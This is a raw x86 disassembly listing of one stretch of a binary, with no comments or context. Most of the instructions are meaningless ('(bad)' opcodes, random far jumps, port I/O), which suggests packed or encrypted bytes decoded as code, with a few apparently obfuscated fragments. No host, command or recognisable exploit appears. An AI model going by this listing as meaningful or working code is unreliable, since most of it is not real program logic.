  403979:	jmp    0xc6bf:0xe27ae745
  403980:	dec    esi
  403981:	add    DWORD PTR [bx+di],edi
  403984:	repz xchg esi,eax
  403986:	mov    ecx,0x159a0f82
  40398b:	(bad)  
  40398c:	shl    DWORD PTR [ecx],cl
  40398e:	sbb    al,0xc9
  403990:	or     BYTE PTR [ebx+edi*8+0x19],bh
  403994:	ret    
  403995:	adc    ecx,edi
  403997:	cld    
  403998:	mov    dl,0x96
  40399a:	pop    edi
  40399b:	mov    ds:0xbbd589e1,al
  4039a0:	in     eax,dx
  4039a1:	aas    
  4039a2:	or     al,0x26
  4039a4:	or     DWORD PTR [esp+edx*2-0x41],ebx
  4039a8:	adc    eax,0x36b91643
  4039ad:	inc    edi
  4039ae:	test   eax,0x6bf3e555
  4039b3:	retf   0x7755
  4039b6:	adc    edi,edx
  4039b8:	repnz add DWORD PTR [ebx],edx
  4039bb:	pop    edi
  4039bc:	lahf   
  4039bd:	out    dx,al
  4039be:	mov    ds:0x61e34a78,al
  4039c3:	stos   BYTE PTR es:[edi],al
  4039c4:	test   al,0x9a
  4039c6:	pop    esi
  4039c7:	xor    dh,al
  4039c9:	das    
  4039ca:	adc    al,0x79
  4039cc:	sbb    ah,BYTE PTR [ebp-0x458334fb]
  4039d2:	ret    0xc4f8
  4039d5:	push   cs
  4039d6:	pop    esp
  4039d7:	add    BYTE PTR [eax+0x514208dd],ch
  4039dd:	lock add esp,DWORD PTR [edi+0x46c11502]
  4039e4:	inc    ebp
  4039e5:	addr16 and ecx,eax
  4039e8:	jmp    0xbd2c:0x67b6eb52
  4039ef:	pop    esi
  4039f0:	and    al,0x77
  4039f2:	mov    ah,0xaf
  4039f4:	shl    al,0xa
  4039f7:	jmp    0x403a22
  4039f9:	cmp    al,0x9f
  4039fb:	adc    al,0xb2
  4039fd:	or     DWORD PTR [ebx+0x21],edi
  403a00:	mov    eax,ds:0x578dddba
  403a05:	loopne 0x40398f
  403a07:	in     al,dx
  403a08:	sub    dh,BYTE PTR [esp+ebx*2]
  403a0b:	push   ebx
  403a0c:	lock daa 
  403a0e:	or     al,0xc0
  403a10:	rcl    ch,cl
  403a12:	in     al,0xb0
  403a14:	xchg   DWORD PTR [ecx+0x3c],edx
  403a17:	dec    ecx
  403a18:	xor    al,0x9b
  403a1a:	cmc    
  403a1b:	test   eax,0xe8566d27
  403a20:	sub    al,0xe5
  403a22:	retf   
  403a23:	mov    edx,0x562c39d0
  403a28:	inc    DWORD PTR [edi]
  403a2a:	pop    ds
  403a2b:	mov    ch,0xe1
  403a2d:	cld    
  403a2e:	(bad)  
  403a2f:	stc    
  403a30:	(bad)  
  403a31:	mov    esp,?
  403a33:	sbb    eax,DWORD PTR [esi]
  403a35:	add    DWORD PTR ds:0x44730e45,ebx
  403a3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a3c:	es xchg esi,eax
  403a3e:	xchg   DWORD PTR [esi+edx*4-0x7134cb5d],ebp
  403a45:	mov    ebx,0x9cb440df
  403a4a:	xchg   ebx,eax
  403a4b:	jne    0x4039f3
  403a4d:	pop    ss
  403a4e:	scas   eax,DWORD PTR es:[edi]
  403a4f:	jbe    0x403a02
  403a51:	push   esi
  403a52:	call   0xe2bd:0x1df81a19
  403a59:	cmp    al,0x18
  403a5b:	rcr    BYTE PTR [ebp+eiz*8+0x27],1
  403a5f:	sbb    BYTE PTR [eax],al
  403a61:	or     DWORD PTR [ebx+0x70],esp
  403a64:	jl     0x4039f7
  403a66:	sub    ebp,DWORD PTR [esi+0x17afdeaf]
  403a6c:	dec    ebp
  403a6d:	inc    edx
  403a6e:	jb     0x403a30
  403a70:	push   ecx
  403a71:	push   eax
  403a72:	or     DWORD PTR [ebp+edx*8-0x4c9e3a94],0xfffffff2
  403a7a:	into   
  403a7b:	adc    BYTE PTR [edx],dl
  403a7d:	sub    DWORD PTR [ebp-0x57],edi
  403a80:	in     al,0x9c
  403a82:	or     al,0x59
  403a84:	dec    ecx
  403a85:	and    al,0x6f
  403a87:	outs   dx,BYTE PTR ds:[esi]
  403a88:	in     eax,dx
  403a89:	mov    dl,0xad
  403a8b:	out    0x8e,al
  403a8d:	xchg   esi,eax
  403a8e:	sbb    DWORD PTR [ebp-0x600f0161],eax
  403a94:	adc    ch,BYTE PTR [esp+esi*4]
  403a97:	ja     0x403aff
  403a99:	xchg   bl,bl
  403a9b:	cld    
  403a9c:	add    esi,ebp
  403a9e:	mov    eax,ds:0x5363c6b6
  403aa3:	xor    BYTE PTR [edi-0xa91601a],bh
  403aa9:	cmp    BYTE PTR [ecx-0x20272ecb],0x4
  403ab0:	retf   
  403ab1:	cmc    
  403ab2:	inc    esi
  403ab3:	xchg   ebp,eax
  403ab4:	jns    0x403af0
  403ab6:	mov    ds:0x58c401d9,al
  403abb:	ds call 0x1662:0x6ca9238c
  403ac3:	nop
  403ac4:	stos   BYTE PTR es:[edi],al
  403ac5:	xor    ebx,DWORD PTR [ebx]
  403ac7:	inc    edx
  403ac8:	push   eax
  403ac9:	rcr    BYTE PTR [eax-0x19],cl
  403acc:	jecxz  0x403a75
  403ace:	inc    esi
  403acf:	sub    al,0x7a
  403ad1:	mov    esp,DWORD PTR [ebp-0x2f326a80]
  403ad7:	push   ebp
  403ad8:	int    0xa1
  403ada:	aad    0x34
  403adc:	adc    cl,BYTE PTR [esi-0x25]
  403adf:	add    eax,0x61284af6
  403ae4:	ret    0xe882
  403ae7:	xlat   BYTE PTR ds:[ebx]
  403ae8:	inc    eax
  403ae9:	pop    edx
  403aea:	mov    edx,0x163a6d0d
  403aef:	mov    edi,0xfff458a
  403af4:	mov    bh,0xd
  403af6:	jmp    0x403ade
  403af8:	inc    edx
  403af9:	add    BYTE PTR [ecx],dl
  403afb:	or     eax,0x42fd76
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e124,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fcfd,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fcf5
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx-0x7c188a69],esi
  403b3e:	or     al,0xc5
  403b40:	push   ds
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0xbd70707d
  403b48:	cmc    
  403b49:	sbb    eax,0x314c51e6
  403b4e:	inc    ebp
  403b4f:	stos   DWORD PTR es:[edi],eax
  403b50:	and    al,BYTE PTR [ecx-0x40]
  403b53:	fidivr DWORD PTR [edi+0x61afabe5]
  403b59:	stos   BYTE PTR es:[edi],al
  403b5a:	rcl    BYTE PTR [eax],0x3b
  403b5d:	inc    ebx
  403b5e:	addr16 dec ebx
  403b60:	mov    BYTE PTR [ecx],bl
  403b62:	mov    ah,0x3e
  403b64:	cmp    bh,0x6d
  403b67:	fs push cs
  403b69:	xchg   esp,eax
  403b6a:	mov    ecx,0x7ceabc
  403b6f:	cmc    
  403b70:	rol    DWORD PTR [edi-0x56dcc1de],0xa9
  403b77:	sbb    DWORD PTR [esi-0x13],edx
  403b7a:	sahf   
  403b7b:	fdiv   QWORD PTR [edi]
  403b7d:	jae    0x403b3b
  403b7f:	mov    eax,ds:0x3f30af85
  403b84:	push   esp
  403b85:	outs   dx,BYTE PTR ds:[esi]
  403b86:	ins    DWORD PTR es:[edi],dx
  403b87:	iret   
  403b88:	loop   0x403b4c
  403b8a:	int3   
  403b8b:	push   es
  403b8c:	cwde   
  403b8d:	mov    cl,0x71
  403b8f:	pop    ebp
  403b90:	xchg   esi,eax
  403b91:	inc    ebx
  403b92:	jno    0x403b8d
  403b94:	mov    dh,0x85
  403b96:	sbb    esi,DWORD PTR [eax-0x31]
  403b99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b9a:	daa    
  403b9b:	sbb    bh,dh
  403b9d:	jns    0x403c17
  403b9f:	xchg   esi,ecx
  403ba1:	ret    
  403ba2:	scas   al,BYTE PTR es:[edi]
  403ba3:	pop    es
  403ba4:	jno    0x403bcc
  403ba6:	arpl   WORD PTR [esi+eax*4],cx
  403ba9:	inc    esi
  403baa:	inc    esi
  403bab:	test   BYTE PTR [edx],cl
  403bad:	out    0xd8,al
  403baf:	sahf   
  403bb0:	xor    al,BYTE PTR [edx+0x19]
  403bb3:	push   esi
  403bb4:	cli    
  403bb5:	sbb    bl,BYTE PTR [ebp-0x6c]
  403bb8:	and    BYTE PTR [edi],dl
  403bba:	aaa    
  403bbb:	cwde   
  403bbc:	sub    DWORD PTR [ecx+ebp*2-0x10],0xd289b7bf
  403bc4:	stos   BYTE PTR es:[edi],al
  403bc5:	scas   al,BYTE PTR es:[edi]
  403bc6:	(bad)  
  403bc7:	sbb    ebx,DWORD PTR [edi]
  403bc9:	std    
  403bca:	dec    edx
  403bcb:	and    BYTE PTR [edi+0x4a0916cd],cl
  403bd1:	je     0x403bd4
  403bd3:	data16 xor ch,BYTE PTR [edx-0xbac3a1e]
  403bda:	push   es
  403bdb:	adc    BYTE PTR [esi+eiz*4+0x2204f451],0x7
  403be3:	xor    al,0xd0
  403be5:	mov    WORD PTR [edx+0x1a],ds
  403be8:	and    al,0x7f
  403beb:	retf   0xef13
  403bee:	cmc    
  403bef:	cmp    cl,BYTE PTR [ecx+ebp*8-0x37]
  403bf3:	jmp    0x14ea:0xa0117af5
  403bfa:	std    
  403bfb:	std    
  403bfc:	cwde   
  403bfd:	(bad)  
  403bfe:	adc    BYTE PTR [ebp+0x3d],cl
  403c01:	xor    DWORD PTR [eax+0x3490f82b],eax
  403c07:	mov    dl,0x26
  403c09:	(bad)  
  403c0a:	adc    dh,BYTE PTR [edi]
  403c0c:	xchg   DWORD PTR [edx+0x4c],esp
  403c0f:	or     DWORD PTR ds:0xc9eb1ed8,0xffffffd5
  403c16:	loope  0x403bcd
  403c18:	outs   dx,DWORD PTR ds:[esi]
  403c19:	inc    eax
  403c1a:	pop    es
  403c1b:	xlat   BYTE PTR ds:[ebx]
  403c1c:	jecxz  0x403bae
  403c1e:	jmp    0x403ba2
  403c20:	mov    bl,0x14
  403c22:	sbb    BYTE PTR [edi],cl
  403c24:	mov    ebx,0x67bd238f
  403c29:	pop    ecx
  403c2a:	shr    esp,1
  403c2c:	cdq    
  403c2d:	in     al,0x6a
  403c2f:	or     ch,bl
  403c31:	cmp    DWORD PTR [ecx],esi
  403c33:	push   ds
  403c34:	mov    dh,0xae
  403c36:	test   dh,bl
  403c38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c39:	xchg   ebp,eax
  403c3a:	xchg   cl,dh
  403c3c:	inc    eax
  403c3d:	mov    bl,0xf7
  403c3f:	pop    ebx
  403c40:	inc    esp
  403c41:	outs   dx,BYTE PTR ds:[esi]
  403c42:	cmp    dl,BYTE PTR [esi]
  403c44:	xchg   ecx,eax
  403c45:	push   0x9a76f48c
  403c4a:	into   
  403c4b:	or     BYTE PTR [eax],0x27
  403c4e:	das    
  403c4f:	sub    DWORD PTR [edx],0x10
  403c52:	mov    esi,0x8d2b92a0
  403c57:	jle    0x403c46
  403c59:	mov    ebx,0x80b59d16
  403c5e:	call   0x49ec9312
  403c63:	xor    dh,BYTE PTR [ecx+0x14]
  403c66:	push   ebx
  403c67:	jecxz  0x403cdb
  403c69:	ja     0x403c33
  403c6b:	data16 mov cl,0xa2
  403c6e:	popa   
  403c6f:	leave  
  403c70:	cli    
  403c71:	cld    
  403c72:	adc    ebp,DWORD PTR [ecx+0x5266dec3]
  403c78:	and    eax,0x960953bf
  403c7d:	bound  ebp,QWORD PTR [ebp-0x6aed32d1]
  403c83:	retf   
  403c84:	gs sbb al,0xff
  403c87:	pop    esp
  403c88:	cwde   
  403c89:	in     al,dx
  403c8a:	sbb    eax,DWORD PTR [edx]
  403c8c:	push   ecx
  403c8d:	pushf  
  403c8e:	aaa    
  403c8f:	mov    edx,0x6410870f
  403c94:	xchg   edi,eax
  403c95:	mov    esi,DWORD PTR [ebx+ebx*4+0x77a6b174]
  403c9c:	cmp    esp,DWORD PTR [esi-0x497272e1]
  403ca2:	jge    0x403cfd
  403ca4:	(bad)  
  403ca5:	out    0xf,al
  403ca7:	ins    DWORD PTR es:[edi],dx
  403ca8:	icebp  
  403ca9:	dec    ebp
  403caa:	and    edx,DWORD PTR [esi+0x390ffca9]
  403cb0:	ja     0x403ca5
  403cb2:	mov    ch,0xef
  403cb4:	xchg   BYTE PTR [eax+0x1f889a94],dl
  403cba:	mov    DWORD PTR [edi+0x108fefed],eax
  403cc0:	add    eax,0x3ba48666
  403cc5:	add    eax,DWORD PTR [ebp-0x17]
  403cc8:	out    dx,al
  403cc9:	xor    ebx,DWORD PTR [ecx+0xc193118]
  403ccf:	ror    DWORD PTR [esi-0x34405723],1
  403cd5:	lock mov ss,WORD PTR [ebp+0x52]
  403cd9:	loop   0x403c79
  403cdb:	mov    edi,0xaaf52b4c
  403ce0:	sbb    ah,BYTE PTR [eax]
  403ce2:	rcr    DWORD PTR [esi+0x4e],1
  403ce5:	dec    ebp
  403ce6:	pop    ebp
  403ce7:	mov    edx,0x6777a49f
  403cec:	sbb    ebx,eax
  403cee:	jle    0x403d6d
  403cf0:	dec    edi
  403cf1:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cf3:	jge    0x403ca1
  403cf5:	arpl   WORD PTR [edi+0xc56bd22],ax
  403cfb:	mov    ebx,0xd26554b7
  403d00:	xor    dh,bh
  403d02:	pop    ecx
  403d03:	in     eax,dx
  403d04:	pop    esp
  403d05:	sahf   
  403d06:	retf   0x98da
  403d09:	rol    edi,0x36
  403d0c:	xchg   esi,eax
  403d0d:	repz sub al,0xc4
  403d10:	mov    dl,0x49
  403d12:	(bad)  
  403d13:	lahf   
  403d14:	(bad)  
  403d15:	jmp    0x403cab
  403d17:	lock push esp
  403d19:	pop    ss
  403d1a:	retf   
  403d1b:	pop    esi
  403d1c:	lock mov esp,fs
  403d1f:	inc    eax
  403d20:	in     eax,0xae
  403d22:	pop    ebx
  403d23:	bound  ecx,QWORD PTR [eax-0x35a57f5f]
  403d29:	in     al,dx
  403d2a:	and    dh,BYTE PTR [ecx+0x19]
  403d2d:	and    DWORD PTR [ebp-0x4],edi
  403d30:	aas    
  403d31:	aaa    
  403d32:	std    
  403d33:	popfw  
  403d35:	jg     0x403db4
  403d37:	sub    edi,DWORD PTR [esi+0x10169e49]
  403d3d:	inc    eax
  403d3e:	div    DWORD PTR [bx+di]
  403d41:	pop    eax
  403d42:	or     esp,ecx
  403d44:	push   ecx
  403d45:	inc    ebp
  403d46:	test   al,0xea
  403d48:	gs sbb al,0xaf
  403d4b:	ret    
  403d4c:	out    dx,eax
  403d4d:	aam    0x6
  403d4f:	jns    0x403ce7
  403d51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d52:	adc    BYTE PTR [eax+0x3a861285],al
  403d58:	dec    ebx
  403d59:	lods   eax,DWORD PTR ds:[esi]
  403d5a:	sub    eax,0xff7669f4
  403d5f:	mov    cl,BYTE PTR [ecx]
  403d61:	ret    
  403d62:	test   eax,0x9670b9b0
  403d67:	fdiv   DWORD PTR [eax]
  403d69:	stos   BYTE PTR es:[edi],al
  403d6a:	and    DWORD PTR [ecx-0x6677daa7],esp
  403d70:	and    DWORD PTR [ecx-0x34f3511b],0xc
  403d77:	dec    esi
  403d78:	in     eax,0x49
  403d7a:	or     bl,BYTE PTR [edx]
  403d7c:	mov    ah,0x67
  403d7e:	xor    al,0x8e
  403d80:	mov    cl,0xab
  403d82:	push   ds
  403d83:	div    BYTE PTR [edi]
  403d85:	sti    
  403d86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d87:	mov    al,ds:0x4267a8ce
  403d8c:	jmp    0xd3c8:0xb228aacd
  403d93:	or     bl,al
  403d95:	xchg   esi,eax
  403d96:	repnz lds ebx,FWORD PTR [eax+0x1f]
  403d9a:	repz ja 0x403d2c
  403d9d:	mov    ebx,0xeb6fe0bc
  403da2:	(bad)  
  403da3:	sbb    al,0x2a
  403da5:	aaa    
  403da6:	add    eax,0xe42383ed
  403dab:	xor    ch,0x7e
  403dae:	or     bh,BYTE PTR [eiz*4+0x680d3951]
  403db5:	sub    esp,DWORD PTR [ebx+0x79]
  403db8:	mov    ebx,0x5d0ac55
  403dbd:	aas    
  403dbe:	xchg   ecx,eax
  403dbf:	clc    
  403dc0:	and    eax,ebx
  403dc2:	add    ch,BYTE PTR [eax-0x7d9eeb80]
  403dc8:	push   0x15
  403dca:	inc    eax
  403dcb:	dec    ecx
  403dcc:	in     al,0xd7
  403dce:	inc    edx
  403dcf:	bound  esp,QWORD PTR cs:[eax]
  403dd2:	mov    dh,0x46
  403dd4:	adc    dh,BYTE PTR [edi-0x20]
  403dd7:	or     BYTE PTR [ebx],dh
  403dd9:	fstp   DWORD PTR [ecx]
  403ddb:	adc    ebx,DWORD PTR [esi+0xf]
  403dde:	pop    ds
  403ddf:	dec    ebx
  403de0:	or     al,0xa0
  403de2:	test   DWORD PTR [esi+edi*1+0x28],edx
  403de6:	jbe    0x403db7
  403de8:	dec    ebp
  403de9:	mov    DWORD PTR [esp+edi*2],edi
  403dec:	push   ss
  403ded:	xor    BYTE PTR [esi-0x36],ch
  403df0:	test   BYTE PTR [ebx],ah
  403df2:	outs   dx,DWORD PTR ds:[esi]
  403df3:	pop    ebx
  403df4:	push   esp
  403df5:	xchg   esp,eax
  403df6:	mov    cl,0x23
  403df8:	movd   mm3,DWORD PTR [ebx+0x3f]
  403dfc:	ins    DWORD PTR es:[edi],dx
  403dfd:	xchg   esp,eax
  403dfe:	jge    0x403d86
  403e00:	cwde   
  403e01:	mov    bl,0x90
  403e03:	ins    BYTE PTR es:[edi],dx
  403e04:	scas   eax,DWORD PTR es:[edi]
  403e05:	mov    bh,0x4c
  403e07:	mov    bl,0x46
  403e09:	(bad)  
  403e0a:	mov    ecx,0x8cfc8cfd
  403e0f:	(bad)  
  403e10:	int    0x26
  403e12:	sbb    DWORD PTR [ebx-0x705c7259],edi
  403e18:	les    eax,FWORD PTR [edx]
  403e1a:	data16 (bad) 
  403e1c:	cmp    dh,BYTE PTR [eax]
  403e1e:	sub    ah,ah
  403e20:	pop    edi
  403e21:	cdq    
  403e22:	jbe    0x403df6
  403e24:	sar    bh,1
  403e26:	scas   al,BYTE PTR es:[edi]
  403e27:	jnp    0x403e0e
  403e29:	pop    esp
  403e2a:	lea    esp,[eax]
  403e2c:	rol    BYTE PTR [ebx+0x4e],0xd2
  403e30:	imul   edi,ebx,0x79
  403e33:	and    BYTE PTR [esi],cl
  403e35:	ret    0x52f6
  403e38:	iret   
  403e39:	test   eax,0xac2d2223
  403e3e:	es enter 0xffd2,0x3d
  403e43:	rcr    BYTE PTR [edi-0x4],0xdb
  403e47:	lea    edi,[ebx-0x80]
  403e4a:	retf   
  403e4b:	out    dx,eax
  403e4c:	sbb    al,0xc
  403e4e:	stos   BYTE PTR es:[edi],al
  403e4f:	rep ins DWORD PTR es:[edi],dx
  403e51:	jg     0x403e18
  403e53:	imul   esi,edx,0x915b72b6
  403e59:	pop    ecx
  403e5a:	aas    
  403e5b:	mov    ecx,0xa141ce86
  403e60:	in     eax,dx
  403e61:	lock jmp 0x3d4a9807
  403e67:	gs test ebp,0x2facc309
  403e6e:	dec    ecx
  403e6f:	mov    ds:0x9db2eee2,al
  403e74:	test   DWORD PTR [eiz*4+0x158b9c8],eax
  403e7b:	imul   edi,DWORD PTR [esp+edi*1],0x53
  403e7f:	ja     0x403e22
  403e81:	add    BYTE PTR [ebp+0x17],ch
  403e84:	pop    esp
  403e85:	xor    DWORD PTR [edi-0x3845389e],0x45
  403e8c:	lock xor BYTE PTR [ebp+0x458bf89c],al
  403e93:	clc    
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e11c
  403ea2:	adc    DWORD PTR ds:0x42e70f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fd72,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fd05,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e6ef,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0x1e421c35
  403eec:	sbb    DWORD PTR ss:[edx+0x3d70701b],eax
  403ef3:	jge    0x403f65
  403ef5:	jo     0x403eab
  403ef7:	xor    eax,0xab9845ab
  403efc:	mov    edx,0x1b6a4069
  403f01:	and    al,0x4b
  403f03:	push   0x1e
  403f05:	lds    esp,FWORD PTR [edi-0x196696c8]
  403f0b:	repz pop ecx
  403f0d:	bound  ebp,QWORD PTR [ecx+edi*1]
  403f10:	jmp    0x403ee6
  403f12:	cmp    al,dl
  403f14:	out    dx,eax
  403f15:	xchg   ebx,eax
  403f16:	adc    esp,DWORD PTR [esi+0x83efa23]
  403f1c:	rcl    bh,cl
  403f1e:	xchg   esp,eax
  403f1f:	rol    bh,0xe
  403f22:	jecxz  0x403f34
  403f24:	push   0xffffffa6
  403f26:	mov    bh,0x99
  403f28:	out    dx,al
  403f29:	jmp    0xbe3e0e03
  403f2e:	mov    esi,0x5bd73589
  403f33:	jmp    0xbc1cc0cb
  403f38:	int    0x6a
  403f3a:	stos   DWORD PTR es:[edi],eax
  403f3b:	pop    ecx
  403f3c:	popa   
  403f3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f3e:	fs jg  0x403fbd
  403f41:	repz cmp eax,0x65bc0bac
  403f47:	jmp    0x8db:0x2b4ca024
  403f4e:	sub    cl,BYTE PTR [ecx-0x2dd5ba0e]
  403f54:	xchg   edx,eax
  403f55:	push   0xffffffe8
  403f57:	fwait
  403f58:	mov    ch,0xcf
  403f5a:	cmp    eax,0xbb0bd128
  403f5f:	mov    ds:0x8a9ef57b,al
  403f64:	out    0xa3,eax
  403f66:	test   al,dh
  403f68:	in     eax,dx
  403f69:	popa   
  403f6a:	jae    0x403f2f
  403f6c:	push   0x10
  403f6e:	lods   eax,DWORD PTR ds:[esi]
  403f6f:	clc    
  403f70:	or     al,0xe
  403f72:	ja     0x403fe8
  403f74:	push   cs
  403f75:	pop    eax
  403f76:	fcmove st,st(3)
  403f78:	loop   0x403f2c
  403f7a:	adc    BYTE PTR es:[eax-0x50220858],ah
  403f81:	lods   al,BYTE PTR ds:[esi]
  403f82:	mov    edi,0x968a87ee
  403f87:	adc    eax,0x7a0cd914
  403f8c:	out    0x7a,al
  403f8e:	adc    ah,BYTE PTR [ebp-0x3f206f2d]
  403f94:	pusha  
  403f95:	imul   ecx,DWORD PTR [ebx+edx*1+0x1f5d9a61],0x1b227b4f
  403fa0:	add    DWORD PTR [ebp+0x6f7f432b],esp
  403fa6:	mov    ds:0x2ecdb39e,al
  403fab:	push   0xbb77b61e
  403fb0:	jle    0x403f4d
  403fb2:	push   eax
  403fb3:	test   BYTE PTR [ebp+0x2],0xe6
  403fb7:	push   0xffffff84
  403fb9:	mov    bl,0x60
  403fbc:	mov    al,0xce
  403fbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fbf:	jle    0x403f83
  403fc1:	cs push edx
  403fc3:	jno    0x403fcc
  403fc5:	and    eax,0x66218bb6
  403fca:	retf   
  403fcb:	mov    dl,0xab
  403fcd:	or     BYTE PTR [edx],0x85
  403fd0:	ins    BYTE PTR es:[edi],dx
  403fd1:	fst    QWORD PTR [esi+ebx*2]
  403fd4:	cmp    al,0xc2
  403fd6:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  403fd8:	push   0x43
  403fda:	xor    dl,dl
  403fdc:	pop    ecx
  403fdd:	outs   dx,BYTE PTR ds:[esi]
  403fde:	jge    0x403fa0
  403fe0:	or     bh,BYTE PTR [ebp+0x67]
  403fe3:	arpl   bp,cx
  403fe5:	or     eax,DWORD PTR [ebx-0x4e2a5bab]
  403feb:	jmp    0x19c0:0x1d04a9c6
  403ff2:	xor    al,0x8c
  403ff4:	mov    bl,0xf1
  403ff6:	shl    DWORD PTR [eax],1
  403ff8:	inc    ecx
  403ff9:	jmp    0x98c74b1d
  403ffe:	imul   edx,DWORD PTR [ecx-0x28c42456],0x6
  404005:	dec    ebx
  404006:	fld    TBYTE PTR [esi-0x1f]
  404009:	into   
  40400a:	mov    WORD PTR [esi+0x41],gs
  40400d:	and    eax,0x37427052
  404012:	sbb    al,0xdf
  404014:	cs out 0xa6,al
  404017:	pop    eax
  404018:	test   dh,bl
  40401a:	test   eax,0x7c64fe6c
  40401f:	inc    DWORD PTR [esi+0x4b9cb91b]
  404025:	inc    edx
  404026:	(bad)  
  404027:	dec    DWORD PTR [ebp+0x5e]
  40402a:	inc    edi
  40402b:	in     eax,0xb4
  40402d:	jb     0x404021
  40402f:	int3   
  404030:	fsubr  QWORD PTR [edi-0xb]
  404033:	aam    0x5f
  404035:	stos   BYTE PTR es:[edi],al
  404036:	sbb    BYTE PTR [ecx],al
  404038:	inc    edi
  404039:	adc    eax,0xfcf87d58
  40403e:	rcr    BYTE PTR [ebp+0x2f],1
  404041:	imul   edi,DWORD PTR [eax-0x2c94ec32],0x3c4172c7
  40404b:	repnz fdiv DWORD PTR [edx]
  40404e:	cmp    ecx,eax
  404050:	push   edx
  404051:	gs scas al,BYTE PTR es:[edi]
  404053:	sbb    BYTE PTR [edx],bh
  404055:	rcl    BYTE PTR [esi+0x283e56ce],0x52
  40405c:	inc    ecx
  40405d:	sub    BYTE PTR [edx-0x5c376fc9],dh
  404063:	xor    bl,ah
  404065:	xchg   ebx,eax
  404066:	mov    al,0xa8
  404068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404069:	dec    esi
  40406a:	mov    eax,0xa2d24cbe
  40406f:	mov    ds:0xd386b125,eax
  404074:	xor    esi,DWORD PTR [ebx+edi*4-0x65c64e82]
  40407b:	out    0xc3,al
  40407d:	push   0xc2b9485
  404082:	sar    edx,0xc4
  404085:	pop    esp
  404086:	ficom  WORD PTR ds:0xaffe3647
  40408c:	sahf   
  40408d:	in     eax,dx
  40408e:	jp     0x404107
  404090:	call   0xb3e8:0x50ec5c7b
  404097:	add    ah,BYTE PTR [bp+si-0xa40]
  40409c:	pusha  
  40409d:	test   BYTE PTR [ebx],bl
  40409f:	or     DWORD PTR [eax+ebx*2],esp
  4040a2:	sbb    bh,dl
  4040a4:	aas    
  4040a5:	call   0x9815:0x90a110ca
  4040ac:	push   ss
  4040ad:	out    dx,al
  4040ae:	jle    0x404041
  4040b0:	xchg   esi,eax
  4040b1:	pop    edx
  4040b2:	mov    fs,WORD PTR [edi]
  4040b4:	mov    gs,WORD PTR [edi-0x68096fdf]
  4040ba:	es inc esi
  4040bc:	mov    edi,0x86e27e42
  4040c1:	sub    al,BYTE PTR [eax+ebx*4-0x2c19e522]
  4040c8:	push   0x47aa4e7a
  4040cd:	or     BYTE PTR [edi],al
  4040cf:	test   al,0x13
  4040d1:	jp     0x4040e4
  4040d3:	sbb    ah,BYTE PTR [esi-0x10603a69]
  4040d9:	(bad)  [ecx-0x29]
  4040dc:	aam    0xcb
  4040de:	ror    DWORD PTR [esi-0x31],0xd2
  4040e2:	xchg   esp,eax
  4040e3:	jae    0x404108
  4040e5:	addr16 ret 
  4040e7:	mov    esp,0xc0000b53
  4040ec:	mov    al,0xa1
  4040ee:	add    edx,esp
  4040f0:	mov    esi,0x818f7d9a
  4040f5:	es (bad) 
  4040f8:	fdiv   DWORD PTR [edx+0x19]
  4040fb:	(bad)
  4040fe:	xchg   ecx,eax
  4040ff:	xlat   BYTE PTR ds:[ebx]
  404100:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404101:	cmp    ch,0x3a
  404104:	sub    esi,ecx
  404106:	xor    esp,DWORD PTR [edx]
  404108:	inc    edi
  404109:	and    esi,DWORD PTR gs:[ebp-0x2a]
  40410d:	mov    eax,ds:0xf7072497
  404112:	pusha  
  404113:	push   edx
  404114:	lock (bad) 
  404116:	(bad)  
  404118:	bound  eax,QWORD PTR [ebx-0x22]
  40411b:	xor    DWORD PTR [ecx+0x50],eax
  40411e:	sub    DWORD PTR [edx],esi
  404120:	jne    0x4041a0
  404122:	sbb    eax,0x7dbe34a
  404127:	inc    ebx
  404128:	inc    ebx
  404129:	mov    edi,0x932dab5f
  40412e:	xchg   edi,eax
  40412f:	or     eax,DWORD PTR [eax-0x1668c9f5]
  404135:	jbe    0x4040c3
  404137:	rcl    al,0x91
  40413a:	hlt    
  40413b:	loop   0x40410a
  40413d:	int3   
  40413e:	jne    0x4040da
  404140:	icebp  
  404141:	cli    
  404142:	dec    esi
  404143:	gs cs in eax,0x1e
  404147:	adc    al,BYTE PTR [edi-0x1f]
  40414a:	push   ebp
  40414b:	test   DWORD PTR [ebp-0x5d],edi
  40414e:	in     eax,dx
  40414f:	mov    bl,0xb2
  404151:	ja     0x40412d
  404153:	jmp    0xd090:0xc7b1923f
  40415a:	mov    bh,0x2e
  40415c:	add    esi,DWORD PTR [ebx+ebp*8-0x34]
  404160:	xchg   ebx,eax
  404161:	mov    ds:0xf427287d,al
